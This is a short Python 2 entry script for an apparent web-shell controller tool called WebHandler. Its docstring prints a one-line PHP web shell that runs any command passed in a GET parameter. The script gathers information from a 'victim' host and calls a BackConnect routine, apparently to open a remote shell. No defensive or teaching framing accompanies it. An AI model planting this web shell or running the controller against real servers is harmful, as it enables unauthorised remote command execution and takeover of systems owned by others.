#!/usr/bin/env python

'''
-*- coding: utf-8 -*-
Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>

Command controller for <?php system($_GET[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.
'''

#importing modules
from core.modules.victim_box import victim_box
from core.modules.executer import commander
from core.modules.menu import getargs, get_banner

# check for arguments dependencies
if getargs.url:
    if getargs.method == 'post' and not getargs.parameter:
        print '\n[!] Using "post" method requires --parameter flag, check examples on the help screen'
        exit(1)
    if getargs.method == 'get' and getargs.parameter:
        print '\n[!] Using "get" method doesn\'t require --parameter flag, check examples on the help screen'
        exit(1)
    else:
        print get_banner                            # get WebHandler banner
        victim_box.get_information()                # call get_information and print info
        commander.BackConnect()                     # call BackConnect method
